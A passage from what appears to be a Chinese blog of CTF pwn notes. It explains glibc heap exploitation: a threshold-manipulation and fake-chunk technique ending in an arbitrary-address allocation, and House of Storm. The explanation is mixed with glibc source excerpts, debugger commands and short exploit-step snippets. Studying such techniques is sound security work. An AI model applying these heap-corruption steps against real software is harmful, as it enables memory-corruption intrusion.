<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>victim</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&lt;=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>SIZE_SZ</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span> <span class=o>||</span>
</span></span><span class=line><span class=cl>	<span class=nf>__builtin_expect</span><span class=p>(</span><span class=n>victim</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nf>malloc_printerr</span><span class=p>(</span><span class=n>check_action</span><span class=p>,</span> <span class=s>&#34;malloc(): memory corruption&#34;</span><span class=p>,</span> <span class=nf>chunk2mem</span><span class=p>(</span><span class=n>victim</span><span class=p>),</span> <span class=n>av</span><span class=p>);</span></span></span></code></pre></div></div><p>② <strong>需增加 system_mem ，申请一块大内存时若 ptmalloc 找不到合适内存会调用 sysmalloc 向系统获取，通过如下代码中 mmap_threshold 决定 mmap 还是 brk 扩展堆，若是 brk 则会增加 system_mem</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// if 进入 mmap
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>if</span> <span class=p>(</span><span class=n>av</span> <span class=o>==</span> <span class=nb>NULL</span>
</span></span><span class=line><span class=cl>    <span class=o>||</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=n>nb</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span> <span class=p>(</span><span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=n>mp_</span><span class=p>.</span><span class=n>n_mmaps</span> <span class=o>&lt;</span> <span class=n>mp_</span><span class=p>.</span><span class=n>n_mmaps_max</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=c1>// 所需内存 &lt; mmap_threshold 调用 brk
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=n>brk</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span> <span class=p>(</span><span class=n>MORECORE_FAILURE</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=n>mp_</span><span class=p>.</span><span class=n>sbrk_base</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=n>mp_</span><span class=p>.</span><span class=n>sbrk_base</span> <span class=o>=</span> <span class=n>brk</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>av</span><span class=o>-&gt;</span><span class=n>system_mem</span> <span class=o>+=</span> <span class=n>size</span><span class=p>;</span> <span class=c1>// 此时将增加 system_mem
</span></span></span></code></pre></div></div><p>③ <strong>需要增加 mmap_threshold，释放 mmap 得到的内存会在 mmap_threshold 与 chunk 的 size 取最值，于是申请和释放一块大的 mmap 申请的内存将 mmap_threshold 增大，再申请一块大内存增大 system_mem</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>chunk_is_mmapped</span> <span class=p>(</span><span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=n>mp_</span><span class=p>.</span><span class=n>no_dyn_threshold</span>
</span></span><span class=line><span class=cl>		<span class=o>&amp;&amp;</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&gt;</span> <span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span>
</span></span><span class=line><span class=cl>		<span class=o>&amp;&amp;</span> <span class=n>p</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&lt;=</span> <span class=n>DEFAULT_MMAP_THRESHOLD_MAX</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span> <span class=o>=</span> <span class=nf>chunksize</span> <span class=p>(</span><span class=n>p</span><span class=p>);</span> <span class=c1>// 增大mmap_threshold
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>mp_</span><span class=p>.</span><span class=n>trim_threshold</span> <span class=o>=</span> <span class=mi>2</span> <span class=o>*</span> <span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nf>LIBC_PROBE</span> <span class=p>(</span><span class=n>memory_mallopt_free_dyn_thresholds</span><span class=p>,</span> <span class=mi>2</span><span class=p>,</span> <span class=n>mp_</span><span class=p>.</span><span class=n>mmap_threshold</span><span class=p>,</span> <span class=n>mp_</span><span class=p>.</span><span class=n>trim_threshold</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>munmap_chunk</span> <span class=p>(</span><span class=n>p</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div></div><p><strong>构造利用条件</strong></p><p>申请大内存接着释放</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xa00000</span><span class=p>)</span> <span class=c1># chunk 0</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; p/x mp_ <span class=c1># 查看 mmap_threshold 从 0x20000 增加到 0xa01000</span></span></span></code></pre></div></div><p>再次申请大内存释放</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xa00000</span><span class=p>)</span> <span class=c1># chunk 1</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span></span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; p main_arena <span class=c1># 查看 system_mem 从 0 增加到 0xa21000, 此时 top chunk size 也为0xa21000</span></span></span></code></pre></div></div><p><strong>实际利用</strong></p><p>将一个 chunk 释放到 fast bin 中</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># chunk 2 用于 UAF 更改 fd 指向 fake chunk</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x80</span><span class=p>)</span> <span class=c1># chunk 3 用于触发 malloc_consolidate</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># chunk 2 进入 fast bin</span>
</span></span><span class=line><span class=cl><span class=n>edit</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span> <span class=c1># 构造 chunk 2 fd 指向 &amp;fake chunk</span></span></span></code></pre></div></div><p>构造 fake chunk，此时 fast bin 中为 chunk 2 和 fake chunk</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>fake</span> <span class=n>chunk</span>
</span></span><span class=line><span class=cl><span class=n>prev_size</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mh>0x1</span> <span class=c1>// 避免 malloc_consolidate 时与前后 chunk 合并，size 为1查找的前后一个地址相邻 chunk 为自身
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>fd</span> <span class=o>=</span> <span class=n>null</span></span></span></code></pre></div></div><p>释放不在 fast bin 范围的 chunk 3，其与 top chunk 合并后大小大于 FASTBIN_CONSOLIDATION_THRESHOLD 即 0x10000 触发 malloc_consolidate：遍历 fastbin 合并放入 unsorted bin 中</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>size</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=n>FASTBIN_CONSOLIDATION_THRESHOLD</span><span class=p>){</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nf>have_fastchunks</span><span class=p>(</span><span class=n>av</span><span class=p>))</span>
</span></span><span class=line><span class=cl>		<span class=nf>malloc_consolidate</span><span class=p>(</span><span class=n>av</span><span class=p>);</span></span></span></code></pre></div></div><p>此时 fake chunk 进入 unsorted bin，而原本在 fast bin 中的 chunk 和释放的 chunk 都合并到 top chunk 中</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span></span></span></code></pre></div></div><p>修改 fake chunk 的 size 大于 0x80000</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>fake</span> <span class=n>chunk</span>
</span></span><span class=line><span class=cl><span class=n>prev_size</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mh>0x90000</span></span></span></code></pre></div></div><p>申请一个大于 0x80000 的内存使得 fake chunk 进入 large bin 中最后一个 bin</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xa00000</span><span class=p>)</span> <span class=c1># chunk 4</span></span></span></code></pre></div></div><p>修改 fake chunk 的 size 为负数</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>fake</span> <span class=n>chunk</span>
</span></span><span class=line><span class=cl><span class=n>prev_size</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=n>size</span> <span class=o>=</span> <span class=mh>0xffffffffffffffff</span> <span class=c1>// 即-1
</span></span></span></code></pre></div></div><p>malloc(-offset)在 fake chunk 处向前 malloc，即向前分割一块区域此时目标地址 target = &amp;fake chunk - offset 作为一个被分割后剩下的 chunk，处于 unsorted bin 中</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0xffffffffffffff70</span><span class=p>)</span> <span class=c1># 即malloc(-0x90), 向前分割0x90的chunk malloc出来, 剩余进入unsorted bin中</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mh>0x10</span><span class=p>)</span> <span class=c1># 劫持target</span></span></span></code></pre></div></div><p><strong>glibc-2.26 起，unlink 加入对 next chunk 的 prev_size 检查，从 large bin 中取出 chunk 时用 unlink</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>__builtin_expect</span> <span class=p>(</span><span class=nf>chunksize</span><span class=p>(</span><span class=n>P</span><span class=p>)</span> <span class=o>!=</span> <span class=nf>prev_size</span> <span class=p>(</span><span class=nf>next_chunk</span><span class=p>(</span><span class=n>P</span><span class=p>)),</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=nf>malloc_printerr</span> <span class=p>(</span><span class=n>check_action</span><span class=p>,</span> <span class=s>&#34;corrupted size vs. prev_size&#34;</span><span class=p>,</span> <span class=n>P</span><span class=p>,</span> <span class=n>AV</span><span class=p>);</span></span></span></code></pre></div></div><p><strong>glibc-2.27 起，malloc_consolidate 加入对 fast bin 中 chunk 的 size 的检查</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=o>&amp;</span><span class=nf>fastbin</span> <span class=p>(</span><span class=n>av</span><span class=p>,</span> <span class=n>idx</span><span class=p>))</span> <span class=o>!=</span> <span class=n>fb</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nf>malloc_printerr</span> <span class=p>(</span><span class=s>&#34;malloc_consolidate(): invalid chunk size&#34;</span><span class=p>);</span></span></span></code></pre></div></div><h4 id=house-of-storm>House of Storm</h4><ul><li>&lt;glibc-2.28，利用 unsoretd bin attack + large bin attack，达成任意地址 malloc</li><li>unsorted bin attack 能将目标地址 fake chunk 链入 unsorted bin，取出其中另一个 chunk 使得在目标地址 bk 写入 <code>unsorted_chunks(av)</code>，但想将 fake chunk 申请出来通不过检查，利用 large bin 特性伪造 fake chunk 的 size 和 fd 字段</li></ul><p><strong>条件</strong></p><ul><li>unsorted bin bk 可控，large bin bk & bk_nextsize 可控</li><li>large bin 和 unsorted bin 分别有一个 chunk，归位后处于同一 large bin index 中，且 unsorted bin 中 chunk 比 largebin 中的大</li></ul><p><strong>原理</strong></p><p>构造完后申请内存，进入<code>_int_malloc</code></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=c1>// 在 unsorted bin中找，并将相应的bin按照大小放入small bin和large bin中
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>for</span> <span class=p>(;;){</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span> <span class=n>iters</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>((</span><span class=n>victim</span> <span class=o>=</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>)</span> <span class=o>!=</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>))</span> <span class=c1>// 反向遍历寻找，先取 size 小的chunk
</span></span></span></code></pre></div></div><p>不在 small bin 范围内所以不切割，而是将其取出放入 large bin 导致 <strong>unsorted bin attack</strong>，fake chunk 中的 fd 实际为需要劫持的目标</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>)</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=nf>unsorted_chunks</span><span class=p>(</span><span class=n>av</span><span class=p>);</span></span></span></code></pre></div></div><img src=/img/pwn_note.zh-cn.assets/image-20250104145453251.png alt=图片无法加载><ul><li>大小属于 large bin，large bin 中 chunk 按大小降序排列</li><li>首先特判大小小于最小 chunk 情况： <code>bk</code> 访问最小的 chunk ，根据构造，待加入 large bin 的 chunk 大于 large bin 中最小 chunk</li><li>因此执行 else 内容</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>size</span><span class=p>)</span> <span class=o>&lt;</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)(</span><span class=n>bck</span><span class=o>-&gt;</span><span class=n>bk</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)){}</span>
</span></span><span class=line><span class=cl><span class=k>else</span> <span class=c1>// victim不为最小size
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>assert</span><span class=p>((</span><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&amp;</span> <span class=n>NON_MAIN_ARENA</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// 遍历找到第一个小于等于victim size的chunk
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>while</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>size</span> <span class=o>&lt;</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>fwd</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span><span class=p>;</span> <span class=c1>// 不断遍历使得fwd-&gt;size非严格递减
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=nf>assert</span><span class=p>((</span><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>size</span> <span class=o>&amp;</span> <span class=n>NON_MAIN_ARENA</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>size</span> <span class=o>==</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>long</span><span class=p>)</span><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>size</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>fwd</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>fd</span><span class=p>;</span> <span class=c1>// 插入第二个位置，则不需要更新fd_nextsize和bk_nextsize
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>else</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span> <span class=c1>// 此时victim &gt; fwd(同样大小第一个)，更新将victim插入fwd前
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk_nextsize</span><span class=o>-&gt;</span><span class=n>fd_nextsize</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span> <span class=c1>// 更改【1】
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>bck</span> <span class=o>=</span> <span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk</span><span class=p>;</span> <span class=c1>// bck 更新为找到的fwd的上一个chunk
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=n>victim</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>bck</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>victim</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>fwd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>fwd</span><span class=o>-&gt;</span><span class=n>bk</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>bck</span><span class=o>-&gt;</span><span class=n>fd</span> <span class=o>=</span> <span class=n>victim</span><span class=p>;</span> <span class=c1>// 将当前chunk插入到对应bin中 更改【2】
</span></span></span></code></pre></div></div><p>large bin attack 修改了 fake chunk 的 size 和 bk 字段，开启 PIE 情况下 size 被错位修改为堆地址的开头<code>0x56</code>或<code>0x55</code>，下图中省略了一些线，可根据源码调试补充</p><img src=/img/pwn_note.zh-cn.assets/image-20250104173240765.png alt=图片无法加载><p>在后续会进行检查</p><ul><li>如果 size 为 0x55 ，则 <code>IS_MAPPED</code> 没有置位，会判断 <code>arena_for_chunk(mem2chunk(victim))</code> 。由于 <code>NON_MAIN_ARENA</code> 置位导致计算出的 <code>arena</code> 不是 <code>main_arena(ar_ptr)</code> 无法通过检查</li><li>如果 size 为 0x56 那么 <code>IS_MAPPED</code> 置位可以通过检查，即有概率申请通过</li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-c"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>assert</span><span class=p>(</span><span class=o>!</span><span class=n>victim</span> <span class=o>||</span> <span class=nf>chunk_is_mmapped</span><span class=p>(</span><span class=nf>mem2chunk</span><span class=p>(</span><span class=n>victim</span><span class=p>))</span>
</span></span><span class=line><span class=cl>       <span class=o>||</span> <span class=n>ar_ptr</span> <span class=o>==</span> <span class=nf>arena_for_chunk</span><span class=p>(</span><span class=nf>mem2chunk</span><span class=p>(</span><span class=n>victim</span><span class=p>)));</span></span></span></code></pre></div></div><p>最终修改后的 fake chunk 将被申请出来，以 0x50 大小的堆块返回，即可劫持目标</p><p><strong>利用</strong></p><img src=/img/pwn_note.zh-cn.assets/image-20250104125535345.png alt=图片无法加载><p>申请 large bin chunk 以及 unsorted bin chunk（顺带泄露 libc）</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-python"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
<span class=copy title=复制到剪贴板><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mh>0x418</span><span class=p>)</span> <span class=c1># 小 chunk 0</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mh>0x18</span><span class=p>)</span> <span class=c1># 分割两个chunk</span>
